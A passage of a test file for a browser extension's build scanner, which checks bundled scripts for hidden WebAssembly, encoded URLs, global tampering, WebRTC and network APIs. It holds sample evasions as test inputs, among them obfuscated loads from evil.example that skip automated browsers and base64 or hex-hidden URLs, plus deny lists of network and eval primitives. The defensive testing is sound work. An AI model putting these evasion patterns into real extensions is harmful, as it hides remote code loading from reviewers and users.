import { describe, expect, it } from 'vitest';
import { randomBytes } from 'node:crypto';
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import {
  ALLOWED_ORIGINS,
  forbiddenNames,
  hiddenTexts,
  cssLoadingInStrings,
  iceServerSchemes,
  injectedFunctions,
  pagePlatformProblems,
  windowReaches,
  importsRuntime,
  scriptProblems,
  tamperingPrimitives,
  urlOrigins,
  wasmSignatures,
} from '../../scripts/lib/wasm-scan';
import { stripComments } from '../../scripts/lib/strip-comments';
import { REAL_CHUNK } from './helpers/runtime-chunk';

// WebAssembly can reach a built script as bytes: written out as a literal, base64, hex, an escape or a number list.
// Whatever the spelling, a script of the build that carries the header of a module (\0asm) is refused, unless it is
// one of the pinned vendor files (checked by path and sha256 elsewhere).
describe('wasmSignatures', () => {
  const NUL = String.fromCharCode(0);
  it.each([
    ['the raw header bytes', `var m="${NUL}asm${String.fromCharCode(1)}";`],
    ['a \\0 escape', 'var m="\\0asm\\x01";'],
    ['a \\x00 escape', 'var m="\\x00asm";'],
    ['a \\u0000 escape', 'var m="\\u0000asm";'],
    ['a \\u{0} escape', 'var m="\\u{0}asm";'],
    ['an octal escape', 'var m="\\000asm";'],
    [
      'base64',
      'fetch("data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQAHBwEDYWRkAAAKCQEHACAAQQFqCw==")',
    ],
    ['base64 alone', 'const b="AGFzbQEAAA";'],
    ['a hex string', 'const h="0061736d01000000";'],
    ['a hex string in upper case', 'const h="0061736D01000000";'],
    ['a decimal list', 'new Uint8Array([0,97,115,109,1,0,0,0])'],
    ['a decimal list with spaces', 'new Uint8Array([ 0 , 97 , 115 , 109 ])'],
    ['String.fromCharCode', 'String.fromCharCode(0,97,115,109)'],
    ['a hex list', 'new Uint8Array([0x00,0x61,0x73,0x6d])'],
    ['a hex list in upper case', 'new Uint8Array([0X00,0X61,0X73,0X6D])'],
    ['a mixed list', 'new Uint8Array([0,0x61,115,0b1101101])'],
    ['an octal list', 'new Uint8Array([0,0o141,0o163,0o155])'],
    ['a reference to a .wasm file', 'fetch("https://cdn.example.com/x.wasm")'],
    ['a relative .wasm file', 'new URL("./x.wasm", import.meta.url)'],
  ])('finds %s', (_name, code) => {
    expect(wasmSignatures(code), code).not.toEqual([]);
  });

  it.each([
    'const a=[0,97,115];',
    'const a=[1,97,115,109];',
    'var s="asm.js";',
    'const wasm="webassembly";',
    'x.wasmPaths',
    'const n="AGFzb";',
    'var t="00617365";',
    'const w=document.createElement("wasm-viewer");',
    'return t.slice(0,97)+u.slice(115,109)',
  ])('does not mistake %j for a module', (code) => {
    expect(wasmSignatures(code), code).toEqual([]);
  });
});

describe('scriptProblems: the settings that would make onnxruntime-web load other code or bytes', () => {
  const RESULT = 'assets/result-4HZRFhwR.js';
  const withWasmPaths = (rhs: string) =>
    REAL_CHUNK.replace('.wasm.wasmPaths=I()', `.wasm.wasmPaths=${rhs}`);

  it.each([
    ['not assigned at all', REAL_CHUNK.replace('t.wasm.proxy=!0,', '')],
    ['false', REAL_CHUNK.replace('t.wasm.proxy=!0', 't.wasm.proxy=!1')],
    ['computed', REAL_CHUNK.replace('t.wasm.proxy=!0', 't.wasm.proxy=navigator.webdriver')],
    ['assigned twice', REAL_CHUNK.replace('t.wasm.proxy=!0,', 't.wasm.proxy=!0,t.wasm.proxy=!1,')],
    ['reassigned after the check', `${REAL_CHUNK};o.env.wasm.proxy=!1`],
  ])(
    "rejects proxy %s (the runtime would fetch its files with this page's fetch)",
    (_what, code) => {
      expect(scriptProblems(RESULT, code).join('\n'), code).toContain('proxy must be assigned');
    },
  );

  it('rejects a chunk that imports the runtime and mentions none of its settings', () => {
    const problems = scriptProblems(RESULT, 'import*as o from"../ort/ort.wasm.min.mjs";export{o};');
    expect(problems.join('\n')).toMatch(/proxy must be assigned/);
    expect(problems.join('\n')).toMatch(/start-up check/);
  });

  it('recognises the chunk that imports the vendored runtime', () => {
    expect(importsRuntime(REAL_CHUNK)).toBe(true);
    expect(importsRuntime("import*as o from'../ort/ort.wasm.min.mjs';")).toBe(true);
    for (const other of [
      'import*as o from"../ort/other.mjs";',
      'import*as o from"./ort/ort.wasm.min.mjs";',
      'const a="../ort/ort.wasm.min.mjs";',
    ]) {
      expect(importsRuntime(other), other).toBe(false);
    }
  });

  it('accepts the chunk as the build emits it', () => {
    expect(scriptProblems(RESULT, REAL_CHUNK)).toEqual([]);
  });

  it('accepts the inlined spelling too: the value written in place', () => {
    expect(scriptProblems(RESULT, withWasmPaths('chrome.runtime.getURL("ort/")'))).toEqual([]);
  });

  it.each([
    [
      'a decoded string, conditional on the environment (the review of PR #6)',
      'decodeURI("getManifest"in chrome.runtime&&!navigator.webdriver?"%68ttps://evil.example/ort/":I())',
    ],
    ['a different call', 'g()'],
    ['a call with an argument', 'I("x")'],
    ['another directory', 'chrome.runtime.getURL("ort/x/")'],
    ['another file of the extension', 'chrome.runtime.getURL("ort/ort-wasm-simd-threaded.wasm")'],
    ['a string literal', '"https://evil.example/ort/"'],
    ['a template', '`https://evil.example/ort/`'],
    ['an object', '{wasm:"https://evil.example/x",mjs:I()}'],
    ['a frozen object', 'Object.freeze({mjs:I(),wasm:"https://evil.example/x"})'],
    ['a conditional', 'a?I():"x"'],
    ['a variable', 'where'],
    ['a member', 'cfg.url'],
    ['a sequence', '(0,I())'],
  ])('rejects wasmPaths set from %s', (_what, rhs) => {
    expect(scriptProblems(RESULT, withWasmPaths(rhs)).join('\n'), rhs).toContain('wasmPaths');
  });

  it('rejects a function that returns anything but exactly the packaged directory', () => {
    for (const body of [
      'chrome.runtime.getURL("ort/x")',
      'decodeURI("%68ttps://evil.example/")',
      'chrome.runtime.getURL("ort/")+"x"',
    ]) {
      const chunk = REAL_CHUNK.replace(
        'var I=()=>chrome.runtime.getURL("ort/")',
        `var I=()=>${body}`,
      );
      expect(scriptProblems(RESULT, chunk).join('\n'), body).toContain('wasmPaths');
    }
  });

  it('rejects a second assignment and an undefined function', () => {
    expect(scriptProblems(RESULT, `${REAL_CHUNK};e.wasm.wasmPaths=I()`).join('\n')).toContain(
      'wasmPaths',
    );
    expect(
      scriptProblems(
        RESULT,
        REAL_CHUNK.replace('var I=()=>chrome.runtime.getURL("ort/");', ''),
      ).join('\n'),
    ).toContain('wasmPaths');
    expect(
      scriptProblems(RESULT, `${REAL_CHUNK};var I=()=>chrome.runtime.getURL("ort/")`).join('\n'),
    ).toContain('wasmPaths');
  });

  it('rejects a chunk without the start-up check, or without the call of it', () => {
    const noCall = REAL_CHUNK.replace('(o.env,I())', '()');
    expect(scriptProblems(RESULT, noCall).join('\n')).toContain('start-up check');
    const wrongArgument = REAL_CHUNK.replace('(o.env,I())', '(o.env,"x")');
    expect(scriptProblems(RESULT, wrongArgument).join('\n')).toContain('start-up check');
    const noMessages = REAL_CHUNK.replaceAll('Refusing to start: ', 'Stop: ');
    expect(scriptProblems(RESULT, noMessages).join('\n')).toMatch(
      /start-up check|wasmPaths|wasmBinary/,
    );
    const inlined = withWasmPaths('chrome.runtime.getURL("ort/")').replace(
      '(o.env,I())',
      '(o.env,chrome.runtime.getURL("ort/"))',
    );
    expect(scriptProblems(RESULT, inlined)).toEqual([]);
  });

  it('rejects any other mention of the two names in that chunk', () => {
    for (const extra of [
      'x.wasmBinary=b',
      'use(o.env.wasm.wasmPaths)',
      'const{wasmPaths:p}=o.env.wasm',
      'init({wasmPaths:u})',
      'Reflect.set(o.env.wasm,"wasmBinary",b)',
    ]) {
      expect(scriptProblems(RESULT, `${REAL_CHUNK};${extra}`).join('\n'), extra).toMatch(
        /wasmPaths|wasmBinary/,
      );
    }
  });

  it.each([
    'assets/welcome-abc.js',
    'assets/i18n-abc.js',
    'background.js',
    'select.js',
    'assets/ort/result-abc.js',
    'result-abc.js',
  ])('rejects the two names in %s, which does not configure the runtime', (file) => {
    expect(scriptProblems(file, 'o.env.wasm.wasmPaths=I()').join('\n')).toContain('wasmPaths');
    expect(scriptProblems(file, 'o.env.wasm.wasmBinary=b').join('\n')).toContain('wasmBinary');
  });

  it('reports a module header in any script', () => {
    expect(scriptProblems('assets/x.js', 'new Uint8Array([0,97,115,109])').join('\n')).toMatch(
      /WebAssembly module/,
    );
  });

  it('has nothing to say about an ordinary script', () => {
    expect(scriptProblems('assets/x.js', 'export const a=1;function f(){return[0,1,2,3]}')).toEqual(
      [],
    );
  });
});

describe('a .wasm file named in any string form', () => {
  it.each([
    ['a string', 'fetch("https://cdn.example.com/x.wasm")'],
    ['single quotes', "fetch('x.wasm')"],
    ['a template', 'fetch(`x.wasm`)'],
    ['the bare extension, for a concatenation', 'const u=base+".wasm";'],
    ['a query', 'fetch("x.wasm?v=1")'],
    ['a fragment', 'fetch("x.wasm#a")'],
    ['upper case', 'fetch("X.WASM")'],
    ['a \\x2e escape', 'fetch("x\\x2ewasm")'],
    ['a \\u002e escape', 'fetch("x\\u002ewasm")'],
    ['a \\u{2e} escape', 'fetch("x\\u{2e}wasm")'],
    ['a percent escape', 'fetch("x%2ewasm")'],
    ['a percent escape in upper case', 'fetch("x%2Ewasm")'],
    ['an escaped "w"', 'fetch("x.\\u0077asm")'],
    ['a double percent escape', 'fetch("x%252ewasm")'],
  ])('finds %s', (_what, code) => {
    expect(wasmSignatures(code), code).toContain('a reference to a .wasm file');
  });

  it.each([
    'import*as o from"../ort/ort.wasm.min.mjs";',
    'o.env.wasm.wasmPaths=I()',
    'const w="wasm";',
    'const w=".wasmx";',
    'const w="the wasm file";',
    'x.wasm',
  ])('does not mistake %s for a module file', (code) => {
    expect(wasmSignatures(code), code).not.toContain('a reference to a .wasm file');
  });
});

describe('base64 of a module header at any alignment', () => {
  const HEADER = Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
  it.each([0, 1, 2, 3, 4, 5])('is found after %i bytes of anything', (before) => {
    for (let i = 0; i < 20; i++) {
      const base64 = Buffer.concat([randomBytes(before), HEADER, randomBytes(7)]).toString(
        'base64',
      );
      expect(wasmSignatures(`const w="${base64}";`), base64).toContain('base64 of a module header');
    }
  });

  it('is found in a data: URL and in base64url', () => {
    const base64 = Buffer.concat([randomBytes(2), HEADER, randomBytes(6)]).toString('base64url');
    expect(wasmSignatures(`x("data:application/wasm;base64,${base64}")`)).not.toEqual([]);
  });

  it('does not fire on ordinary base64 text', () => {
    for (let i = 0; i < 200; i++) {
      expect(wasmSignatures(`const w="${randomBytes(24).toString('base64')}";`)).toEqual([]);
    }
  });
});

describe('absolute URLs in built scripts', () => {
  it('allows only the Google Fonts hosts the page links to', () => {
    expect([...ALLOWED_ORIGINS].sort()).toEqual(['fonts.google.com', 'fonts.googleapis.com']);
    expect(urlOrigins('x="https://fonts.googleapis.com/css2?family=A&display=swap"')).toEqual([
      'fonts.googleapis.com',
    ]);
    expect(urlOrigins('x=`https://fonts.google.com/specimen/${n}`')).toEqual(['fonts.google.com']);
  });

  it.each([
    ['https://evil.example/ort/', 'evil.example'],
    ['http://evil.example/ort/', 'evil.example'],
    ['//evil.example/ort/', 'evil.example'],
    ['HTTPS://EVIL.EXAMPLE/x', 'evil.example'],
    ['wss://evil.example/s', 'evil.example'],
    ['ftp://evil.example/x', 'evil.example'],
    ['blob:https://evil.example/uuid', 'evil.example'],
    ['https://user:pw@evil.example:8443/x', 'evil.example'],
    ['%68ttps://evil.example/ort/', 'evil.example'],
    ['\\x68ttps://evil.example/ort/', 'evil.example'],
    ['\\u0068ttps://evil.example/ort/', 'evil.example'],
    ['https:%2f%2fevil.example/x', 'evil.example'],
    ['https%3A%2F%2Fevil.example%2Fx', 'evil.example'],
    ['http://127.0.0.1:8000/x', '127.0.0.1'],
    ['https://fonts.googleapis.com.evil.example/x', 'fonts.googleapis.com.evil.example'],
    ['https://evilfonts.google.com/x', 'evilfonts.google.com'],
    ['https://fonts-gstatic.com/x', 'fonts-gstatic.com'],
    ['https://fonts.gstatic.com.evil.example/x', 'fonts.gstatic.com.evil.example'],
    ['https://fonts.googleapis.com@evil.example/x', 'evil.example'],
    ['https://fonts.googleapis.com:pw@evil.example/x', 'evil.example'],
    ['https://fonts.googleapis.com\\@evil.example/x', 'evil.example'],
    ['https://xfonts.googleapis.com/x', 'xfonts.googleapis.com'],
    ['https://fonts.googleapis.com.cn/x', 'fonts.googleapis.com.cn'],
    ['https://fonts.google.com.evil.example/x', 'fonts.google.com.evil.example'],
    ['https://fonts.googleapis.co/x', 'fonts.googleapis.co'],
  ])('finds %s', (url, host) => {
    for (const quote of ['"', "'", '`']) {
      expect(urlOrigins(`const u=${quote}${url}${quote};`), url).toContain(host);
    }
  });

  it('refuses fonts.gstatic.com when a script names it: the font files arrive in the CSS of Google, no script has the host', () => {
    expect(ALLOWED_ORIGINS.has('fonts.gstatic.com')).toBe(false);
    expect(
      scriptProblems('assets/x.js', 'fetch("https://fonts.gstatic.com/s/x.woff2")').join('\n'),
    ).toContain('names a URL on fonts.gstatic.com');
  });

  it('names exactly the two Google Fonts hosts in the sources of the extension (render.ts), and no other', () => {
    const hosts = new Set<string>();
    const visit = (dir: string): void => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        const path = join(dir, entry.name);
        if (entry.isDirectory()) visit(path);
        // src/manifest.ts is the build's, not a script of the extension (its e2e-only loopback permission names 127.0.0.1)
        else if (
          path.endsWith('.ts') &&
          !path.endsWith('.d.ts') &&
          path !== join('src', 'manifest.ts')
        ) {
          for (const host of urlOrigins(stripComments(readFileSync(path, 'utf8'), path))) {
            hosts.add(host);
          }
        }
      }
    };
    visit('src');
    // the CSS of fonts.googleapis.com names fonts.gstatic.com; the extension never does
    expect([...hosts].sort()).toEqual([...ALLOWED_ORIGINS].sort());
  });

  it('is reported by scriptProblems with the host', () => {
    const problems = scriptProblems('assets/x.js', 'fetch("https://evil.example/ort/")').join('\n');
    expect(problems).toContain('evil.example');
    expect(problems).toContain('fonts.googleapis.com');
    expect(
      scriptProblems('assets/x.js', 'const u="https://fonts.googleapis.com/css2?family=A";'),
    ).toEqual([]);
  });

  it('has nothing to say about text without a host', () => {
    expect(urlOrigins('const a="a//b",c="http://",d="x:y";')).toEqual([]);
  });
});

describe('primitives that replace what the runtime relies on, in a built script', () => {
  it.each([
    'Object.defineProperty(globalThis,"fetch",{value:f})',
    'Object.defineProperties(window,d)',
    'Object.setPrototypeOf(x,y)',
    'x.__proto__=y',
    'x.__defineGetter__("a",f)',
    'Reflect.set(globalThis,"fetch",f)',
    'Reflect.defineProperty(self,"fetch",d)',
    'globalThis.fetch=f',
    'self.fetch=f',
    'window["fetch"]=f',
    'globalThis.counter+=1',
    'Response.prototype.arrayBuffer=f',
    'Promise.prototype["then"]=f',
    'x.prototype.y=1',
  ])('finds %s', (code) => {
    expect(tamperingPrimitives(code), code).not.toEqual([]);
    expect(scriptProblems('assets/x.js', code).join('\n'), code).toMatch(/replaces|changes/);
  });

  it.each([
    'const a=globalThis.crossOriginIsolated?1:0',
    'globalThis.crypto.randomUUID()',
    'window.devicePixelRatio||1',
    'if(globalThis.a==1)b()',
    'x.prototypeless=1',
    'const o={defineProp:1}',
    'self.setTimeout(f,1)',
    'Object.getOwnPropertyDescriptor(n,"wasmPaths")',
  ])('lets %s through', (code) => {
    expect(tamperingPrimitives(code), code).toEqual([]);
  });
});

// Review round 3 of PR #6: `atob('aHR0cHM6Ly9ldmls...')` and a `.wasm` name in base64 were invisible to the scan, which looked at
// the spelling of URLs and headers only. A literal that DECODES to one is refused now, at every alignment of the encoding.
describe('hiddenTexts: a URL or a module that is written in an encoded form', () => {
  const b64 = (text: string, before = 0): string =>
    Buffer.from('x'.repeat(before) + text, 'latin1').toString('base64');
  const b64url = (text: string): string =>
    Buffer.from(text, 'latin1').toString('base64url').replace(/=+$/, '');
  const hex = (text: string): string => Buffer.from(text, 'latin1').toString('hex');
  const bytes = (text: string): string => [...Buffer.from(text, 'latin1')].join(',');

  it.each([
    ['base64 of an https URL', `fetch(atob("${b64('https://evil.example/ort/')}"))`],
    ['base64 of an http URL', `x("${b64('http://127.0.0.1:8000/b.wasm')}")`],
    ['base64 of a protocol-relative URL', `x("${b64('//evil.example/b')}")`],
    ['base64 of a .wasm name', `x("${b64('ort-wasm-simd-threaded.wasm')}")`],
    ['base64 of a name with a query', `x("${b64('b.wasm?v=2')}")`],
    ['base64url', `x("${b64url('https://evil.example/?a=b>c')}")`],
    ['base64 after one filler byte', `x("${b64('https://evil.example/', 1)}")`],
    ['base64 after two filler bytes', `x("${b64('https://evil.example/', 2)}")`],
    ['base64 after three filler bytes', `x("${b64('https://evil.example/', 3)}")`],
    [
      'base64 with other text around it in the literal',
      `x("data:;base64,${b64('https://evil.example/')}")`,
    ],
    ['hex of a URL', `x("${hex('https://evil.example/')}")`],
    ['hex of a .wasm name', `x("${hex('a.wasm')}")`],
    ['a list of bytes of a URL', `new Uint8Array([${bytes('https://evil.example/')}])`],
    ['a list of bytes of a .wasm name', `x([${bytes('b.wasm')},0])`],
    ['a template literal', 'x(`' + b64('https://evil.example/') + '`)'],
    [
      'an escaped base64 literal',
      `x("${b64('https://evil.example/').replace(/^./, (c) => `\\x${c.charCodeAt(0).toString(16)}`)}")`,
    ],
  ])('finds %s', (_what, code) => {
    expect(hiddenTexts(code), code).not.toEqual([]);
    expect(scriptProblems('assets/result-abc.js', code).join('\n'), code).toMatch(/decodes to/);
  });

  it.each([
    ['base64 of an allowed host', `x("${b64('https://fonts.googleapis.com/css2')}")`],
    ['base64 of plain words', `x("${b64('Refusing to start: proxy must be true')}")`],
    ['an identifier-like word', 'x("getOwnPropertyDescriptor"); y("Uint8ClampedArray")'],
    ['a camel-case name', 'const n = "createImageBitmapWithOptions"'],
    ['hex that is not text', 'const h = "00ff00ff00ff00ff00ff00ff"'],
    ['a short list of numbers', 'const a = [104, 116, 116, 112]'],
    ['numbers with a fraction', 'const m = [0.485, 0.456, 0.406, 1, 2, 3, 4, 5, 6, 7, 8]'],
    ['long numbers of the model', 'const v = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000]'],
  ])('does not mistake %s for a hidden URL', (_what, code) => {
    expect(hiddenTexts(code), code).toEqual([]);
  });

  it('accepts the build of the extension as it is', () => {
    expect(hiddenTexts(REAL_CHUNK)).toEqual([]);
  });
});

describe('forbiddenNames: what no script of the build uses', () => {
  it.each([
    'XMLHttpRequest',
    'WebSocket',
    'EventSource',
    'sendBeacon',
    'importScripts',
    'SharedWorker',
    'Worker',
    'BroadcastChannel',
    'MessageChannel',
    'postMessage',
    'TextDecoder',
    'atob',
    'unescape',
    'decodeURI',
    'fromCodePoint',
    'webdriver',
    'setResourceTimingBufferSize',
    'clearResourceTimings',
    'WebAssembly',
    'instantiateStreaming',
    'compileStreaming',
  ])('refuses %s', (name) => {
    for (const code of [`${name}(x)`, `new ${name}("a")`, `a.${name}(1)`, `a["${name}"]`]) {
      expect(forbiddenNames('assets/result-abc.js', code), code).toContain(name);
      expect(forbiddenNames('background.js', code), code).toContain(name);
    }
  });

  it('refuses a dynamic import() and the words inside a longer name only when they stand alone', () => {
    expect(forbiddenNames('assets/a.js', 'import ( u )')).toEqual(['import(']);
    expect(forbiddenNames('assets/a.js', 'const y = import(u)')).toEqual(['import(']);
    expect(
      forbiddenNames('assets/a.js', 'decodeURIComponent(s); myWorkerCount; atoms; webdrivers'),
    ).toEqual([]);
  });

  it.each([
    "new Function('return this')()",
    "Function('return this')()",
    'eval(code)',
    '(0,eval)(code)',
  ])('refuses code built at run time: %s', (code) => {
    expect(forbiddenNames('assets/result-abc.js', code), code).not.toEqual([]);
  });

  it.each([
    ['select.js', 'void window.fetch("https://example.invalid/m")'],
    ['select.js', 'new Request("https://example.invalid/m")'],
    ['select.js', 'const f=window["fetch"];'],
    ['assets/welcome-abc.js', 'fetch(u)'],
    ['assets/errors-abc.js', 'fetch(u)'],
    ['assets/other-abc.js', 'new Request(u)'],
    ['assets/result-abc.mjs', 'fetch(u)'],
    ['assets/x/result-abc.js', 'fetch(u)'],
    ['result.js', 'fetch(u)'],
    ['dist/background.js.map', 'fetch(u)'],
    ['assets/background-abc.js', 'fetch(u)'],
  ])(
    'refuses fetch and Request outside background.js and the result chunk: %s: %s',
    (file, code) => {
      expect(forbiddenNames(file, code), `${file}: ${code}`).not.toEqual([]);
      expect(scriptProblems(file, code).join('\n')).toMatch(/uses (fetch|Request)/);
    },
  );

  it.each(['background.js', 'assets/result-4HZRFhwR.js', 'assets/result-a_b-C.js'])(
    'allows fetch and Request in %s (allowed, not required)',
    (file) => {
      expect(forbiddenNames(file, 'fetch(u); new Request(u)')).toEqual([]);
      expect(forbiddenNames(file, 'const a=1')).toEqual([]);
    },
  );

  it('lets only the service worker encode the screenshot with btoa and fromCharCode', () => {
    expect(forbiddenNames('background.js', 'btoa(String.fromCharCode(...b))')).toEqual([]);
    expect(forbiddenNames('assets/result-abc.js', 'btoa(String.fromCharCode(...b))')).toEqual([
      'btoa',
      'fromCharCode',
    ]);
    expect(forbiddenNames('select.js', 'btoa(x)')).toEqual(['btoa']);
    expect(forbiddenNames('assets/background-abc.js', 'btoa(x)')).toEqual(['btoa']);
  });

  it('is part of the problems of a script, with the file named', () => {
    expect(scriptProblems('assets/result-abc.js', 'new Worker(u)').join('\n')).toContain(
      'assets/result-abc.js: uses Worker',
    );
  });
});

describe('windowReaches: the Window of a document is held in the page scripts, once, and nowhere else', () => {
  const PAGE = 'assets/result-abc.js';
  const LEGIT = 'x();const a=o.defaultView;if(!a)return;a.addEventListener("hashchange",r);';

  it('accepts the one form of the result and welcome pages', () => {
    expect(windowReaches(PAGE, LEGIT)).toEqual([]);
    expect(windowReaches('assets/welcome-Xy_9.js', LEGIT)).toEqual([]);
  });

  it.each([
    ['assigned to', 'Object.assign(document.defaultView,{fetch:f});'],
    ['passed on', 'use(o.defaultView);'],
    ['aliased', 'const w=o.defaultView;w.fetch=f;'],
    ['read twice', `${LEGIT}${LEGIT}`],
    ['a computed name', 'o["defaultView"]'],
    ['destructured', 'const{defaultView:w}=o;'],
  ])('refuses defaultView %s', (_what, code) => {
    expect(windowReaches(PAGE, code), code).not.toEqual([]);
  });

  it.each([
    'background.js',
    'select.js',
    'assets/errors-abc.js',
    'assets/other-abc.js',
    'assets/result-abc.mjs',
  ])('refuses even the legitimate form in %s', (file) => {
    expect(windowReaches(file, LEGIT)).not.toEqual([]);
  });

  it.each([
    'contentWindow',
    'getBackgroundPage',
    'getViews',
    'currentTarget',
    'composedPath',
    'relatedTarget',
    'srcElement',
  ])('refuses %s anywhere in the build', (name) => {
    expect(forbiddenNames(PAGE, `a.${name}`)).toContain(name);
  });
});

// Round 5, the tester: a STUN or TURN server is named `stun:host:port`, no `//`, so it was no URL for the host scan, and
// RTCPeerConnection left the page for the internet through a lint-clean build.
describe('WebRTC: servers and names that no script of the build uses', () => {
  const RESULT = 'assets/result-abc.js';

  it.each([
    ['stun', "new RTCPeerConnection({iceServers:[{urls:'stun:example.invalid:3478'}]})"],
    ['turn', 'x("turn:example.invalid:3478")'],
    ['turns', "x('turns:example.invalid:5349?transport=tcp')"],
    ['stun', 'x("STUN:example.invalid")'],
    ['turn', 'x("Turn:example.invalid")'],
    ['turns', 'x("TURNS:example.invalid")'],
    ['stun', 'x(`stun:example.invalid:${port}`)'],
    ['stun', 'x("\\x73tun:example.invalid")'],
    ['stun', 'x("stun%3Aexample.invalid".replace("%3A",":")+"stun:a")'],
    // what terser leaves after folding 'st' + 'un:' + host into one literal
    ['stun', 'x("stun:example.invalid:3478")'],
    ['stun', 'x(["stun:example.invalid"])'],
  ])('finds %s: %s', (scheme, code) => {
    expect(iceServerSchemes(code), code).toContain(scheme);
    expect(scriptProblems(RESULT, code).join('\n'), code).toContain('names a WebRTC server');
  });

  it.each([
    'const a="return:value"',
    'const b="subturn:x"',
    'const a="stunning:x"',
    'const a="rstun:x"',
    'x("turnover")',
    'x("the state: stun")',
    'x("https://fonts.googleapis.com/css2?family=A")',
  ])('does not mistake %j for a server', (code) => {
    expect(iceServerSchemes(code), code).toEqual([]);
  });

  it.each([
    'RTCPeerConnection',
    'webkitRTCPeerConnection',
    'mozRTCPeerConnection',
    'RTCDataChannel',
    'RTCIceCandidate',
    'RTCSessionDescription',
    'RTCRtpSender',
    'RTCCertificate',
    'WebTransport',
    'WebTransportDatagramDuplexStream',
  ])('refuses the name %s anywhere in the build', (name) => {
    for (const code of [`new ${name}({})`, `a.${name}`, `a["${name}"]`, `typeof ${name}`]) {
      expect(forbiddenNames(RESULT, code), code).toContain(name);
      expect(forbiddenNames('background.js', code), code).toContain(name);
      expect(forbiddenNames('select.js', code), code).toContain(name);
    }
  });

  it('does not take other names for them', () => {
    expect(
      forbiddenNames(RESULT, 'const RTCount=1; const myRTCPeer=2; RTC; rtcPeerConnection()'),
    ).toEqual([]);
  });

  it('is part of the problems of a script, with the file named', () => {
    const problems = scriptProblems(
      RESULT,
      "new RTCPeerConnection({iceServers:[{urls:'stun:example.invalid:3478'}]})",
    ).join('\n');
    expect(problems).toContain('assets/result-abc.js: uses RTCPeerConnection');
    expect(problems).toContain('assets/result-abc.js: names a WebRTC server (stun:)');
  });
});

// The second layer for the code that runs in the web page's process (select.js, and the function handed to executeScript):
// no network API and no way to load or navigate, spelled with a literal name. Names built at run time are for lint and the
// module graph of select.js, which this layer does not see.
describe('the code of the web page: no network API, no way to load or navigate', () => {
  it.each([
    ['fetch', 'void window.fetch("https://example.invalid/m")'],
    ['a bare fetch', 'fetch(u)'],
    ['Request', 'new Request(u)'],
    ['XMLHttpRequest', 'new XMLHttpRequest()'],
    ['WebSocket', 'new WebSocket("wss://example.invalid/")'],
    ['EventSource', 'new EventSource(u)'],
    ['sendBeacon', 'navigator.sendBeacon(u, d)'],
    ['Image', 'new Image()'],
    ['Audio', 'new Audio(u)'],
    ['Worker', 'new Worker(u)'],
    ['FontFace', 'new FontFace("x", u)'],
    ['RTCPeerConnection', 'new RTCPeerConnection({})'],
    ['webkitRTCPeerConnection', 'new webkitRTCPeerConnection({})'],
    ['WebTransport', 'new WebTransport(u)'],
    ['a dynamic import', 'import(u)'],
    ['an img src', 'const i = document.createElement("img"); i.src = u;'],
    ['a src with spaces', 'i . src  =  u'],
    ['an href', 'a.href = u'],
    ['srcset', 'i.srcset = u'],
    ['srcdoc', 'f.srcdoc = "<img>"'],
    ['action', 'f.action = u'],
    ['innerHTML', 'e.innerHTML = "<img src=x>"'],
    ['outerHTML', 'e.outerHTML = "x"'],
    ['setAttribute', 'e.setAttribute("src", u)'],
    ['setAttribute with a variable', 'e.setAttribute(n, u)'],
    ['insertAdjacentHTML', 'e.insertAdjacentHTML("beforeend", h)'],
    ['insertRule', 's.insertRule(r)'],
    ['window.open', 'window.open(u)'],
    ['open', 'x.open("GET", u)'],
    ['location', 'location.href = u'],
    ['document.location', 'document.location = u'],
    ['url() in a string', 'e.style.background = "url(https://example.invalid/m)"'],
    ['url () with a space', 'e.style.background = "URL (https://example.invalid/m)"'],
    ['image-set', 'e.style.background = "image-set(x 1x)"'],
    ['@import', 's.textContent = "@import x"'],
  ])('refuses %s', (_what, code) => {
    expect(pagePlatformProblems(code), code).not.toEqual([]);
    expect(scriptProblems('select.js', code).join('\n'), code).toContain('runs in the web page');
  });

  it.each([
    'Object.assign(e.style, { position: "fixed", inset: "0", background: "rgba(0,0,0,0.15)" })',
    'const m = [...document.images].find((i) => i.currentSrc === s || i.src === s)',
    'img.scrollIntoView({ block: "nearest" }); const b = img.getBoundingClientRect()',
    'const bmp = ImageBitmap; Object.assign(e.style, { cursor: "crosshair" })',
    'if (a.src == b) run(); if (a.href === b) run()',
    'win.addEventListener("keydown", f, true); win.removeEventListener("keydown", f, true)',
    'const opened = isOpen; const reopen = 1; const locations = 2',
    'e.setAttribute("style", saved); e.removeAttribute("style")',
    "e.setAttribute('style', saved)",
  ])('lets what the real code does through: %s', (code) => {
    expect(pagePlatformProblems(code), code).toEqual([]);
  });

  it('applies to select.js as a whole, and not to the other scripts', () => {
    expect(scriptProblems('select.js', 'new Image()').join('')).toContain('web page');
    expect(scriptProblems('assets/result-abc.js', 'new Image()').join('')).not.toContain(
      'web page',
    );
    expect(
      scriptProblems('assets/welcome-abc.js', 'e.setAttribute("src", u)').join(''),
    ).not.toContain('web page');
  });

  describe('the function handed to executeScript, found in the minified background.js', () => {
    const MINIFIED = (
      body: string,
      call = 'chrome.scripting.executeScript({target:{tabId:r.id,frameIds:[n]},args:[e,"image",null],func:b})',
    ) =>
      `async function k(){const x=1;await ${call};await chrome.scripting.executeScript({target:{tabId:r.id,frameIds:[n]},args:[e],func:q})}async function b(t){${body}}async function q(t){const i=new Image;i.crossOrigin="anonymous";i.src=t;return i}function other(){return fetch(u)}`;

    it('finds a named function, a variable and a function written in place', () => {
      expect(injectedFunctions('background.js', MINIFIED('return 1'))).toEqual([
        'async function b(t){return 1}',
        'async function q(t){const i=new Image;i.crossOrigin="anonymous";i.src=t;return i}',
      ]);
      expect(
        injectedFunctions(
          'background.js',
          'const m=async t=>{return 2};chrome.scripting.executeScript({target:{},func:m})',
        ),
      ).toEqual(['async t=>{return 2}']);
      expect(
        injectedFunctions(
          'background.js',
          'chrome.scripting.executeScript({target:{},"func":function(t){return 3}})',
        ),
      ).toEqual(['function(t){return 3}']);
    });

    it('finds nothing to check when no function is injected, and a func that cannot be read fails', () => {
      expect(injectedFunctions('background.js', 'chrome.tabs.create({url:u})')).toEqual([]);
      expect(
        injectedFunctions(
          'background.js',
          'chrome.scripting.executeScript({target:{},files:["select.js"]})',
        ),
      ).toEqual([]);
      expect(
        injectedFunctions('background.js', 'chrome.scripting.executeScript({target:{},func:gone})'),
      ).toEqual([undefined]);
      expect(
